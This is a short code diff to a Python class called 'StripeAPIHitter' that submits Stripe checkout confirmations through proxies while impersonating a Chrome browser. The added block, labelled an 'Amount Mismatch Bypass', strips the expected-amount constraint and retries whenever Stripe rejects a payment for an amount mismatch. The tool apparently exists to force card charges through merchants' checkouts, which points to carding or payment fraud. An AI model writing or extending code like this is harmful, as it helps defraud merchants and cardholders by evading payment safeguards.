@@ -554,6 +554,13 @@ class StripeAPIHitter:
             confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=headers, data=confirm_data, proxies=proxies, timeout=15, impersonate="chrome116"))
             confirm_json = confirm_res.json()
             
+            # 1% CODER: Dynamic Amount Mismatch Bypass
+            # If the scraped amount was slightly off (taxes/shipping) and caused a mismatch, instantly retry without the constraint
+            if confirm_res.status_code != 200 and confirm_json.get('error', {}).get('code') == 'checkout_amount_mismatch' and 'expected_amount' in confirm_data:
+                del confirm_data['expected_amount']
+                confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=headers, data=confirm_data, proxies=proxies, timeout=15, impersonate="chrome116"))
+                confirm_json = confirm_res.json()
+            
             result['response_time'] = time.time() - start
             
             if confirm_res.status_code == 200:
